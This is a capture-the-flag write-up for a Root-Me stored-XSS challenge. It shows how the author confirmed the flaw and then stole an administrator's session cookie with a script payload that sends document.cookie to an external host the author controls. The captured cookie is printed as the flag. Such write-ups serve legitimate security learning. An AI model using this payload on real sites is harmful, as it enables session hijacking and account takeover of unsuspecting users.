# [XSS Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

**NOTE:** After reading some other solutions using [postbin](https://postb.in/) is 
definitely the way to go instead of going to the trouble of setting up a site with PHP 
and a database. Learn something new all the time!

We get message form. Let's just post a normal message.

We can see our message is saved and directly inserted into the page

`<span><b>test</b></span><br/><span>test</span>`

I bet it's not being sanitized. So let's just put this as our message:

`<script>alert(1)</script>`

We get an alert box so definitely XSS vulnerable. To make this more realistic, we 
have to steal the administrator session cookie. So they probably have a timer running, 
where an admin will come and "read" our messages. 

So we set up a quick and dirty PHP site that takes a GET parameter and stores it in a database.

We submit a message with this: 

`<script>window.location.href='https://zumo22.000webhostapp.com/index.php?content='+document.cookie</script>`

And we wait a little bit. And the admin will get redirected to our malicious site which 
stores his cookie in our database for us to retrieve. We got it!

> ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6

Password is: **NkI9qe4cdLIO2P7MIsWS8ofD6**
